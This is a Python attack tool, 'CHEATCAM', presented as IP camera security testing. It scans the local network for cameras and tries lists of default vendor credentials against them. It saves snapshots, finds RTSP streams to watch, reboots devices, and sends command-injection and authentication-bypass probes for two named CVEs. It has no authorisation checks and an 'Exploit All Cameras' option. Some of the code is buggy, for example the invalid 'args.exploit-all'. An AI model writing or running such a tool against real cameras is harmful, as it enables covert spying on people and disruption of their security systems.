#!/usr/bin/env python3
"""
CHEATCAM v4.0 - Advanced IP Camera Security Testing Framework
Professional Surveillance System Assessment

Author: F1REW0LF
License: MIT
"""

import sys
import os
import re
import json
import time
import socket
import struct
import random
import hashlib
import base64
import threading
import subprocess
import requests
import urllib.parse
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import http.client
import xml.etree.ElementTree as ET
from urllib3.exceptions import InsecureRequestWarning

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP
    from scapy.layers.l2 import ARP, Ether
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import cv2
    import numpy as np
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

VERSION = "4.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    MAGENTA = '\033[95m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}     ██████╗██╗  ██╗███████╗ █████╗ ████████╗ ██████╗ █████╗ ███╗   ███╗
    ██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
    ██║     ███████║█████╗  ███████║   ██║   ██║     ███████║██╔████╔██║
    ██║     ██╔══██║██╔══╝  ██╔══██║   ██║   ██║     ██╔══██║██║╚██╔╝██║
    ╚██████╗██║  ██║███████╗██║  ██║   ██║   ╚██████╗██║  ██║██║ ╚═╝ ██║
     ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝
                                                   
{Colors.NEON}          ULTIMATE v{VERSION} - CAMERA SECURITY{Colors.WHITE}
{Colors.CYAN}    Professional Surveillance System Testing{Colors.WHITE}
{Colors.YELLOW}    Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ==================== CAMERA DATABASE ====================
class CameraDatabase:
    CAMERAS = {
        'hikvision': {
            'brand': 'Hikvision',
            'mac_prefixes': ['24:0a:c4', '00:0e:8f', '00:18:4a'],
            'ports': [80, 443, 8080, 8443, 554, 8554, 8000, 8899],
            'credentials': [
                ('admin', '12345'), ('admin', 'admin'), ('admin', '123456'),
                ('admin', ''), ('root', '12345'), ('root', 'root')
            ],
            'api_paths': [
                '/cgi-bin/check_login.cgi', '/cgi-bin/snapshot.cgi',
                '/cgi-bin/current.jpg', '/cgi-bin/status.cgi',
                '/onvif/device_service', '/cgi-bin/reboot.cgi'
            ],
            'rtsp_paths': ['/stream1', '/stream2', '/live', '/ch1']
        },
        'dahua': {
            'brand': 'Dahua',
            'mac_prefixes': ['30:ae:a4', '00:1c:bf', '00:22:75'],
            'ports': [80, 443, 8080, 8443, 554, 8554, 9000, 8899],
            'credentials': [
                ('admin', 'admin'), ('admin', '123456'), ('admin', ''),
                ('root', 'root'), ('admin', '888888'), ('admin', '666666')
            ],
            'api_paths': [
                '/cgi-bin/api/v1/login', '/cgi-bin/snapshot',
                '/cgi-bin/current.jpg', '/cgi-bin/status',
                '/onvif/device_service', '/cgi-bin/reboot'
            ],
            'rtsp_paths': ['/cam/realmonitor', '/stream1', '/live']
        },
        'axis': {
            'brand': 'Axis',
            'mac_prefixes': ['a4:14:37', '00:40:8c'],
            'ports': [80, 443, 8080, 8443, 554, 8554],
            'credentials': [
                ('root', 'pass'), ('admin', 'admin'), ('root', 'root'),
                ('admin', 'password'), ('root', '')
            ],
            'api_paths': [
                '/axis-cgi/admin/', '/axis-cgi/snapshot.cgi',
                '/axis-cgi/status.cgi', '/onvif/device_service',
                '/axis-cgi/reboot.cgi'
            ],
            'rtsp_paths': ['/axis-media/media.amp', '/stream1', '/live']
        },
        'tp_link': {
            'brand': 'TP-Link',
            'mac_prefixes': ['bc:dd:c2', '00:e0:60'],
            'ports': [80, 443, 8080, 554, 8554],
            'credentials': [
                ('admin', 'admin'), ('admin', '1234'), ('admin', ''),
                ('root', 'root'), ('admin', 'password')
            ],
            'api_paths': [
                '/cgi-bin/login', '/cgi-bin/snapshot',
                '/cgi-bin/status', '/onvif/device_service'
            ],
            'rtsp_paths': ['/stream1', '/live']
        },
        'samsung': {
            'brand': 'Samsung',
            'mac_prefixes': ['00:18:4a', '00:1c:bf'],
            'ports': [80, 443, 8080, 554, 8554],
            'credentials': [
                ('admin', 'admin'), ('admin', '4321'), ('admin', ''),
                ('root', 'root'), ('admin', 'password')
            ],
            'api_paths': [
                '/cgi-bin/snapshot', '/cgi-bin/status',
                '/onvif/device_service', '/cgi-bin/reboot'
            ],
            'rtsp_paths': ['/stream1', '/live']
        },
        'sony': {
            'brand': 'Sony',
            'mac_prefixes': ['00:1a:3f', '00:30:48'],
            'ports': [80, 443, 8080, 554, 8554],
            'credentials': [
                ('admin', 'admin'), ('admin', '1234'), ('admin', ''),
                ('root', 'root'), ('admin', 'password')
            ],
            'api_paths': [
                '/cgi-bin/snapshot', '/cgi-bin/status',
                '/onvif/device_service', '/cgi-bin/reboot'
            ],
            'rtsp_paths': ['/stream1', '/live']
        }
    }
    
    @classmethod
    def identify(cls, mac: str = "", ports: List[int] = None, web_data: str = "") -> Optional[Dict]:
        if mac:
            mac_prefix = mac[:8].lower().replace(':', '')
            for key, data in cls.CAMERAS.items():
                for prefix in data['mac_prefixes']:
                    if mac_prefix.startswith(prefix.replace(':', '')):
                        return {'key': key, **data}
        
        if ports:
            for key, data in cls.CAMERAS.items():
                if any(p in data['ports'] for p in ports):
                    return {'key': key, **data}
        
        if web_data:
            for key, data in cls.CAMERAS.items():
                if data['brand'].lower() in web_data.lower():
                    return {'key': key, **data}
        
        return None

# ==================== CAMERA DISCOVERY ====================
class CameraDiscovery:
    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
        self.cameras = []
    
    def discover(self) -> List[Dict]:
        cprint("\n[DISCOVER] Scanning for IP cameras...", Colors.BLUE)
        
        if not SCAPY_AVAILABLE:
            cprint("[!] Scapy not available", Colors.RED)
            return []
        
        network = self._get_network()
        hosts = self._arp_scan(network)
        
        for host in hosts:
            ip = host.get('ip')
            mac = host.get('mac')
            
            # Port scan
            ports = [80, 443, 8080, 8443, 554, 8554, 8000, 8899, 9000]
            open_ports = self._scan_ports(ip, ports)
            
            if open_ports:
                # Web fingerprint
                web_data = self._get_web_data(ip, open_ports)
                
                # RTSP detection
                rtsp_ports = [554, 8554]
                rtsp_active = [p for p in rtsp_ports if p in open_ports]
                
                # Identify camera
                camera_info = CameraDatabase.identify(mac, open_ports, web_data)
                
                if camera_info:
                    self.cameras.append({
                        'ip': ip,
                        'mac': mac,
                        'brand': camera_info.get('brand', 'Unknown'),
                        'key': camera_info.get('key', 'hikvision'),
                        'ports': open_ports,
                        'rtsp_ports': rtsp_active,
                        'credentials': camera_info.get('credentials', [('admin', 'admin')]),
                        'api_paths': camera_info.get('api_paths', []),
                        'rtsp_paths': camera_info.get('rtsp_paths', [])
                    })
                    cprint(f"[+] Camera found: {ip} ({camera_info.get('brand', 'Unknown')})", Colors.GREEN)
        
        return self.cameras
    
    def _get_network(self):
        try:
            result = subprocess.run(['ip', 'addr', 'show', self.interface], 
                                   capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'inet ' in line:
                    return line.strip().split()[1]
        except:
            pass
        return "192.168.1.0/24"
    
    def _arp_scan(self, network):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), 
                         timeout=3, verbose=False)
            return [{'ip': r.psrc, 'mac': r.hwsrc} for _, r in ans]
        except:
            return []
    
    def _scan_ports(self, ip, ports):
        open_ports = []
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(self._check_port, ip, port): port for port in ports}
            for future in as_completed(futures):
                if future.result():
                    open_ports.append(futures[future])
        return open_ports
    
    def _check_port(self, ip, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def _get_web_data(self, ip, ports):
        for port in ports[:3]:
            try:
                response = requests.get(f"http://{ip}:{port}", timeout=2)
                return response.text
            except:
                pass
        return ""

# ==================== CAMERA EXPLOIT ====================
class CameraExploit:
    def __init__(self, camera: Dict):
        self.camera = camera
        self.ip = camera['ip']
        self.session = requests.Session()
        self.session.verify = False
        self.results = {}
    
    def exploit(self) -> Dict:
        cprint(f"\n[EXPLOIT] Attacking {self.ip} ({self.camera['brand']})", Colors.RED)
        
        # 1. Discover APIs
        self._discover_apis()
        
        # 2. Test credentials
        self._test_credentials()
        
        # 3. Capture snapshot
        self._capture_snapshot()
        
        # 4. RTSP hijack
        self._rtsp_hijack()
        
        # 5. ONVIF exploit
        self._onvif_exploit()
        
        # 6. Firmware exploit
        self._firmware_exploit()
        
        return self.results
    
    def _discover_apis(self):
        cprint("[*] Discovering APIs...", Colors.DIM)
        
        api_paths = self.camera.get('api_paths', [])
        found = []
        
        for port in self.camera.get('ports', [80]):
            for path in api_paths:
                try:
                    url = f"http://{self.ip}:{port}{path}"
                    response = self.session.get(url, timeout=3)
                    if response.status_code in [200, 401, 403]:
                        found.append(url)
                        cprint(f"[+] API: {url}", Colors.GREEN)
                except:
                    pass
        
        self.results['apis'] = found
        return found
    
    def _test_credentials(self):
        cprint("[*] Testing credentials...", Colors.DIM)
        
        creds = self.camera.get('credentials', [('admin', 'admin')])
        found = []
        
        for port in self.camera.get('ports', [80]):
            for username, password in creds:
                try:
                    url = f"http://{self.ip}:{port}/admin"
                    response = self.session.get(url, auth=(username, password), timeout=3)
                    if response.status_code == 200:
                        found.append({'username': username, 'password': password})
                        cprint(f"[+] Credentials: {username}:{password}", Colors.GREEN)
                        break
                except:
                    pass
        
        self.results['credentials'] = found
        return found
    
    def _capture_snapshot(self):
        cprint("[*] Capturing snapshot...", Colors.DIM)
        
        paths = ['/snapshot.jpg', '/image.jpg', '/cgi-bin/snapshot', '/current.jpg']
        
        for port in self.camera.get('ports', [80]):
            for path in paths:
                try:
                    url = f"http://{self.ip}:{port}{path}"
                    response = self.session.get(url, timeout=3)
                    if response.status_code == 200 and len(response.content) > 1000:
                        filename = f"snapshot_{self.ip}_{int(time.time())}.jpg"
                        with open(filename, 'wb') as f:
                            f.write(response.content)
                        self.results['snapshot'] = filename
                        cprint(f"[+] Snapshot saved: {filename}", Colors.GREEN)
                        return
                except:
                    pass
        
        cprint("[!] Could not capture snapshot", Colors.RED)
    
    def _rtsp_hijack(self):
        cprint("[*] Attempting RTSP hijack...", Colors.DIM)
        
        rtsp_paths = self.camera.get('rtsp_paths', ['/stream1'])
        rtsp_ports = self.camera.get('rtsp_ports', [554])
        
        for port in rtsp_ports:
            for path in rtsp_paths:
                try:
                    stream_url = f"rtsp://{self.ip}:{port}{path}"
                    
                    # Try to connect
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.ip, port))
                    sock.send(b"OPTIONS rtsp://example.com RTSP/1.0\r\nCSeq: 1\r\n\r\n")
                    data = sock.recv(1024)
                    sock.close()
                    
                    if b"RTSP" in data:
                        self.results['rtsp'] = stream_url
                        cprint(f"[+] RTSP stream: {stream_url}", Colors.GREEN)
                        return
                except:
                    pass
        
        cprint("[!] RTSP hijack failed", Colors.RED)
    
    def _onvif_exploit(self):
        cprint("[*] Exploiting ONVIF...", Colors.DIM)
        
        for port in self.camera.get('ports', [80]):
            try:
                url = f"http://{self.ip}:{port}/onvif/device_service"
                response = self.session.get(url, timeout=3)
                if response.status_code == 200:
                    self.results['onvif'] = True
                    cprint("[+] ONVIF service found", Colors.GREEN)
                    return
            except:
                pass
    
    def _firmware_exploit(self):
        cprint("[*] Testing firmware exploits...", Colors.DIM)
        
        exploits = [
            {
                'name': 'CVE-2021-36260',
                'description': 'Hikvision Command Injection',
                'url': f'http://{self.ip}/cgi-bin/check_login.cgi',
                'data': {'username': 'admin$(echo exploited)'}
            },
            {
                'name': 'CVE-2021-33044',
                'description': 'Dahua Authentication Bypass',
                'url': f'http://{self.ip}/cgi-bin/api/v1/login',
                'data': {'username': 'admin', 'password': 'aaa'}
            }
        ]
        
        for exploit in exploits:
            try:
                response = self.session.post(exploit['url'], data=exploit['data'], timeout=3)
                if response.status_code in [200, 302]:
                    self.results['firmware'] = exploit['name']
                    cprint(f"[+] Firmware exploit: {exploit['name']}", Colors.GREEN)
                    return
            except:
                pass

# ==================== CAMERA CONTROL ====================
class CameraControl:
    def __init__(self, camera: Dict):
        self.camera = camera
        self.ip = camera['ip']
        self.session = requests.Session()
    
    def view_stream(self):
        cprint(f"\n[VIEW] Opening stream for {self.ip}", Colors.CYAN)
        
        rtsp_url = self.camera.get('rtsp', f"rtsp://{self.ip}:554/stream1")
        cprint(f"[+] RTSP URL: {rtsp_url}", Colors.GREEN)
        
        try:
            subprocess.Popen(['vlc', rtsp_url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            cprint("[+] VLC opened", Colors.GREEN)
        except:
            cprint("[!] VLC not available. Use RTSP URL manually", Colors.YELLOW)
        
        return rtsp_url
    
    def reboot(self):
        cprint(f"\n[REBOOT] Rebooting {self.ip}", Colors.RED)
        
        reboot_paths = ['/cgi-bin/reboot', '/admin/reboot', '/api/reboot']
        
        for port in self.camera.get('ports', [80]):
            for path in reboot_paths:
                try:
                    url = f"http://{self.ip}:{port}{path}"
                    response = self.session.get(url, timeout=3)
                    if response.status_code == 200:
                        cprint("[+] Reboot command sent", Colors.GREEN)
                        return True
                except:
                    pass
        
        cprint("[!] Could not reboot camera", Colors.RED)
        return False
    
    def get_info(self):
        cprint(f"\n[INFO] Getting system info from {self.ip}", Colors.CYAN)
        
        info_paths = ['/cgi-bin/status', '/admin/info', '/api/status']
        
        for port in self.camera.get('ports', [80]):
            for path in info_paths:
                try:
                    url = f"http://{self.ip}:{port}{path}"
                    response = self.session.get(url, timeout=3)
                    if response.status_code == 200:
                        cprint("[+] System info retrieved", Colors.GREEN)
                        return response.text[:500]
                except:
                    pass
        
        cprint("[!] Could not get system info", Colors.RED)
        return None

# ==================== MAIN FRAMEWORK ====================
class CheatCamUltimate:
    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
        self.cameras = []
        self.results = []
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*60}{Colors.WHITE}
{Colors.BOLD}CHEATCAM v4.0 - Attack Menu{Colors.WHITE}
{Colors.BLUE}{'='*60}{Colors.WHITE}
[1] Discover Cameras
[2] Show Cameras
[3] Exploit Camera
[4] Exploit All Cameras
[5] View Camera Stream
[6] Reboot Camera
[7] Get Camera Info
[8] Show Results
[9] Exit
""")
    
    def discover(self):
        discovery = CameraDiscovery(self.interface)
        self.cameras = discovery.discover()
    
    def show_cameras(self):
        if not self.cameras:
            cprint("[!] No cameras", Colors.YELLOW)
            return
        
        print("\n" + "="*60)
        cprint(" CAMERAS", Colors.PURPLE, bold=True)
        print("="*60)
        for i, c in enumerate(self.cameras):
            print(f"{i}. {c['ip']} - {c['brand']}")
            print(f"   Ports: {c.get('ports', [])}")
            print(f"   RTSP: {c.get('rtsp_ports', [])}")
        print("="*60)
    
    def exploit_camera(self):
        if not self.cameras:
            cprint("[!] No cameras", Colors.RED)
            return
        
        self.show_cameras()
        choice = input(f"{Colors.CYAN}[>] Select camera: {Colors.WHITE}").strip()
        
        try:
            idx = int(choice)
            if 0 <= idx < len(self.cameras):
                exploit = CameraExploit(self.cameras[idx])
                result = exploit.exploit()
                self.results.append(result)
                cprint("\n[+] Exploitation complete!", Colors.GREEN)
        except:
            cprint("[-] Invalid selection", Colors.RED)
    
    def exploit_all(self):
        if not self.cameras:
            cprint("[!] No cameras", Colors.RED)
            return
        
        cprint("[*] Exploiting all cameras...", Colors.RED)
        for camera in self.cameras:
            exploit = CameraExploit(camera)
            result = exploit.exploit()
            self.results.append(result)
            time.sleep(1)
        cprint("[+] All cameras exploited!", Colors.GREEN)
    
    def view_stream(self):
        if not self.cameras:
            cprint("[!] No cameras", Colors.RED)
            return
        
        self.show_cameras()
        choice = input(f"{Colors.CYAN}[>] Select camera: {Colors.WHITE}").strip()
        
        try:
            idx = int(choice)
            if 0 <= idx < len(self.cameras):
                control = CameraControl(self.cameras[idx])
                control.view_stream()
        except:
            cprint("[-] Invalid selection", Colors.RED)
    
    def reboot_camera(self):
        if not self.cameras:
            cprint("[!] No cameras", Colors.RED)
            return
        
        self.show_cameras()
        choice = input(f"{Colors.CYAN}[>] Select camera: {Colors.WHITE}").strip()
        
        try:
            idx = int(choice)
            if 0 <= idx < len(self.cameras):
                control = CameraControl(self.cameras[idx])
                control.reboot()
        except:
            cprint("[-] Invalid selection", Colors.RED)
    
    def get_info(self):
        if not self.cameras:
            cprint("[!] No cameras", Colors.RED)
            return
        
        self.show_cameras()
        choice = input(f"{Colors.CYAN}[>] Select camera: {Colors.WHITE}").strip()
        
        try:
            idx = int(choice)
            if 0 <= idx < len(self.cameras):
                control = CameraControl(self.cameras[idx])
                info = control.get_info()
                if info:
                    print("\n" + "="*60)
                    cprint(" CAMERA INFO", Colors.PURPLE, bold=True)
                    print("="*60)
                    print(info)
                    print("="*60)
        except:
            cprint("[-] Invalid selection", Colors.RED)
    
    def show_results(self):
        print("\n" + "="*60)
        cprint(" RESULTS", Colors.PURPLE, bold=True)
        print("="*60)
        
        if not self.results:
            cprint("[!] No results", Colors.YELLOW)
            return
        
        for i, result in enumerate(self.results):
            cprint(f"\n[{i+1}] Camera", Colors.CYAN)
            for key, value in result.items():
                if value:
                    if isinstance(value, list):
                        cprint(f"  {key}: {len(value)} items", Colors.DIM)
                        for item in value[:3]:
                            if isinstance(item, dict):
                                cprint(f"    - {str(item)[:100]}", Colors.DIM)
                    elif isinstance(value, dict):
                        for k, v in value.items():
                            cprint(f"  {k}: {v}", Colors.DIM)
                    else:
                        cprint(f"  {key}: {value}", Colors.DIM)
        
        print("="*60)
    
    def run(self):
        print_banner()
        cprint("[*] CHEATCAM - IP Camera Security Testing", Colors.CYAN)
        
        while True:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1': self.discover()
            elif choice == '2': self.show_cameras()
            elif choice == '3': self.exploit_camera()
            elif choice == '4': self.exploit_all()
            elif choice == '5': self.view_stream()
            elif choice == '6': self.reboot_camera()
            elif choice == '7': self.get_info()
            elif choice == '8': self.show_results()
            elif choice == '9':
                cprint("[*] Exiting...", Colors.GREEN)
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ==================== MAIN ====================
def main():
    parser = argparse.ArgumentParser(
        description="CHEATCAM v4.0 - IP Camera Security Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 cheatcam.py --discover
  python3 cheatcam.py --discover --exploit-all
  python3 cheatcam.py --interface eth0
        """
    )
    
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface")
    parser.add_argument("--discover", action="store_true", help="Discover only")
    parser.add_argument("--exploit-all", action="store_true", help="Exploit all cameras")
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        cprint("[!] Root privileges required", Colors.RED)
        sys.exit(1)
    
    if args.discover:
        discovery = CameraDiscovery(args.interface)
        discovery.discover()
    elif args.exploit-all:
        tool = CheatCamUltimate(args.interface)
        tool.discover()
        tool.exploit_all()
        tool.show_results()
    else:
        tool = CheatCamUltimate(args.interface)
        tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
